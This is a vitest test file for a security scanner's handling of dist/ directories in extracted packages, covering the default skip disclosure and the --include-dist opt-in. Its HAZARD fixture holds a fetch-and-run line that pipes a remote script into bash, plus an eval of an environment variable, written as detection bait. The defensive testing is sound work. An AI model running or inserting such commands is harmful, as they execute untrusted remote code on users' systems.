/**
 * #1010 — `secure` on an extracted package whose code lives under `dist/`
 * examined no code file and reported a full score.
 *
 * The source walkers (`findSourceFiles`, `walkDirectory`, the decode walk) skip
 * `dist/` as build output, which is right for a project checkout and wrong for
 * a published package, where `dist/` is the code that runs. Measured on
 * `@modelcontextprotocol/server-filesystem` 1.0.0 (9 files, 7 `.js` under
 * `dist/`): `coverage.examined 2, total 2`, the README and `package.json`.
 *
 * Two halves, each with its control:
 *
 *   Disclosure — the default still skips `dist/`, and `coverage` now names
 *                each skipped one with its file count, so a caller can tell
 *                "nothing examined" from "nothing found". A tree without a
 *                `dist/` carries no such key, so its document is unchanged.
 *   Opt-in     — `includeDist` (`secure --include-dist`) walks it: the same
 *                hazard under `dist/` is reported and its files are examined.
 *                The default run of the same tree is the negative control.
 */
import { describe, it, expect, beforeAll } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdirSync, writeFileSync } from 'node:fs';
import * as path from 'node:path';
import { HardeningScanner } from '../../src/hardening/scanner';
import { tempDir } from '../helpers/temp-dir';
import { assertDistFresh, BUILT_CLI } from '../helpers/dist-freshness';

// A hazard the JS-family walks report wherever they read it (#414's payload).
const HAZARD =
  `const { execSync } = require("child_process");\n` +
  `execSync("curl -sL http://example.com/stage.sh | bash");\n` +
  `eval(process.env.PAYLOAD_STAGE);\n`;

function write(root: string, rel: string, body: string): void {
  mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
  writeFileSync(path.join(root, rel), body);
}

/** An extracted package: manifest and README at the root, the code under dist/. */
function extractedPackage(): string {
  const root = tempDir('hma-1010-pkg-');
  write(root, 'package.json', JSON.stringify({ name: 'pkg-1010', version: '1.0.0', main: 'dist/index.js' }) + '\n');
  write(root, 'README.md', '# pkg-1010\n');
  write(root, 'dist/index.js', HAZARD);
  write(root, 'dist/lib/util.js', 'module.exports = {};\n');
  return root;
}

const fromDist = (findings: Array<{ file?: string; passed?: boolean }>) =>
  findings.filter((f) => !f.passed && (f.file ?? '').startsWith('dist/'));

describe('#1010 dist/ walk: disclosure by default, opt-in walk', () => {
  it('the default skips dist/ and names it in coverage with its file count', async () => {
    const root = extractedPackage();
    const result = await new HardeningScanner().scan({ targetDir: root });

    expect(result.coverage?.skippedDirectories).toEqual([{ path: 'dist', files: 2 }]);
    // The control for the opt-in case below: the default reads nothing there.
    expect(fromDist(result.findings), 'the default walk reached dist/, so the opt-in proves nothing').toEqual([]);
  });

  it('includeDist walks dist/: its hazard is reported, more files are examined, nothing is named as skipped', async () => {
    const root = extractedPackage();
    const skipped = await new HardeningScanner().scan({ targetDir: root });
    const walked = await new HardeningScanner().scan({ targetDir: root, includeDist: true });

    expect(walked.coverage?.skippedDirectories).toBeUndefined();
    expect(fromDist(walked.findings).map((f) => f.file)).toContain('dist/index.js');
    expect(walked.coverage!.filesExamined).toBeGreaterThan(skipped.coverage!.filesExamined);
  });

  it('a tree without dist/ carries no skippedDirectories key', async () => {
    const root = tempDir('hma-1010-nodist-');
    write(root, 'package.json', '{"name":"p","version":"0.0.1"}\n');
    write(root, 'src/index.js', 'module.exports = {};\n');
    const result = await new HardeningScanner().scan({ targetDir: root });

    expect(result.coverage).toBeDefined();
    expect('skippedDirectories' in result.coverage!).toBe(false);
  });

  it('names a nested dist/ by its relative path, and leaves out node_modules, hidden, empty and ignored ones', async () => {
    const root = tempDir('hma-1010-nested-');
    write(root, 'package.json', '{"name":"mono","version":"0.0.1"}\n');
    write(root, 'packages/a/dist/index.js', 'module.exports = 1;\n');
    write(root, 'packages/b/dist/index.js', 'module.exports = 2;\n');
    write(root, 'node_modules/dep/dist/index.js', 'module.exports = 3;\n');
    write(root, '.cache/dist/index.js', 'module.exports = 4;\n');
    mkdirSync(path.join(root, 'packages/c/dist'), { recursive: true });

    const result = await new HardeningScanner().scan({ targetDir: root, ignorePaths: ['packages/b'] });

    expect(result.coverage?.skippedDirectories).toEqual([{ path: 'packages/a/dist', files: 1 }]);
  });
});

describe('#1010 secure --include-dist, end to end', () => {
  // Required of every suite that spawns the built CLI
  // (__tests__/harness/spawn-suites-assert-freshness.test.ts).
  beforeAll(assertDistFresh);

  const secureJson = (root: string, extra: string[]) => {
    const run = spawnSync(process.execPath, [BUILT_CLI, 'secure', root, '--json', '--static-only', ...extra], {
      encoding: 'utf8',
      maxBuffer: 64 * 1024 * 1024,
    });
    return JSON.parse(run.stdout) as {
      findings: Array<{ file?: string; passed?: boolean }>;
      coverage: { examined: number; total: number; skippedDirectories?: unknown };
    };
  };

  it('the flag reaches the scan: dist/ is examined and reported, and the default names it as skipped', () => {
    const root = extractedPackage();
    const skipped = secureJson(root, []);
    const walked = secureJson(root, ['--include-dist']);

    expect(skipped.coverage.skippedDirectories).toEqual([{ path: 'dist', files: 2 }]);
    expect(fromDist(skipped.findings)).toEqual([]);

    expect(walked.coverage.skippedDirectories).toBeUndefined();
    expect(fromDist(walked.findings).map((f) => f.file)).toContain('dist/index.js');
    expect(walked.coverage.examined).toBeGreaterThan(skipped.coverage.examined);
  });

  it('the text report names the skipped dist/ and the command that walks it, and drops both once it is walked', () => {
    const root = extractedPackage();
    const text = (extra: string[]) => {
      const run = spawnSync(process.execPath, [BUILT_CLI, 'secure', root, '--static-only', ...extra], {
        encoding: 'utf8',
        env: { ...process.env, NO_COLOR: '1' },
      });
      return `${run.stdout ?? ''}${run.stderr ?? ''}`;
    };

    const skipped = text([]);
    expect(skipped).toMatch(/Not walked\s+dist\/\s+\(2 files, build output\)/);
    expect(skipped).toContain('secure --include-dist');

    const walked = text(['--include-dist']);
    expect(walked, 'the skipped-directory line printed on a run that walked dist/').not.toContain('Not walked');
  });
});
